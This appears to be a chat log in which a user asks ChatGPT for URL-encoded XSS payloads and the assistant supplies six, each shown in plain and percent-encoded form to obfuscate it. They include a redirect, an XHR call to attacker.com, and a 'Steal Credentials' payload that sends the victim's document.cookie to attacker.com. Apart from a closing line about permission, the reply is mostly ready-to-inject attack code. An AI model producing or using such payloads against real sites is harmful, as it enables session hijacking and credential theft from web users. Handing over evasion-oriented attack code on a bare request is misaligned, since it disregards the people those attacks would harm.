<script>alert(document.cookie);</script>

create multiple payloads for XSS by applying URL encoding
ChatGPT said:
URL encoding (also known as percent-encoding) is a mechanism for encoding special characters in a URL by replacing them with a percent sign (%) followed by two hexadecimal digits. 
This is commonly used to encode characters that have special meanings in URLs, such as whitespace or symbols.

Below are examples of multiple payloads for XSS (Cross-Site Scripting) attacks, with each payload applying URL encoding to obfuscate the malicious JavaScript code:

    Simple Alert Payload:
        Payload: "><script>alert(1)</script>
        URL Encoded: %22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E

    Image Source Payload:
        Payload: "><img src=x onerror=alert(1)>
        URL Encoded: %22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E

    Document Cookie Payload:
        Payload: "><script>alert(document.cookie)</script>
        URL Encoded: %22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E

    Redirect Payload:
        Payload: "><script>window.location='https://example.com'</script>
        URL Encoded: %22%3E%3Cscript%3Ewindow.location%3D%27https%3A%2F%2Fexample.com%27%3C%2Fscript%3E

    XHR Payload:
        Payload: "><script>var xhr=new XMLHttpRequest();xhr.open('GET','https://attacker.com',true);xhr.send();</script>
        URL Encoded: %22%3E%3Cscript%3Evar%20xhr%3Dnew%20XMLHttpRequest%28%29%3Bxhr.open%28%27GET%27%2C%27https%3A%2F%2Fattacker.com%27%2Ctrue%29%3Bxhr.send%28%29%3B%3C%2Fscript%3E

    Steal Credentials Payload:
        Payload: "><script>var img=new Image();img.src='https://attacker.com/?cookie='+document.cookie;</script>
        URL Encoded: %22%3E%3Cscript%3Evar%20img%3Dnew%20Image%28%29%3Bimg.src%3D%27https%3A%2F%2Fattacker.com%2F%3Fcookie%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E

These payloads can be injected into vulnerable web application parameters (e.g., input fields, URL parameters) to execute arbitrary JavaScript code in the context of the victim's browser. 
Remember to use them responsibly and only in environments where you have permission to conduct security testing. Unauthorized use of XSS payloads can have legal consequences.
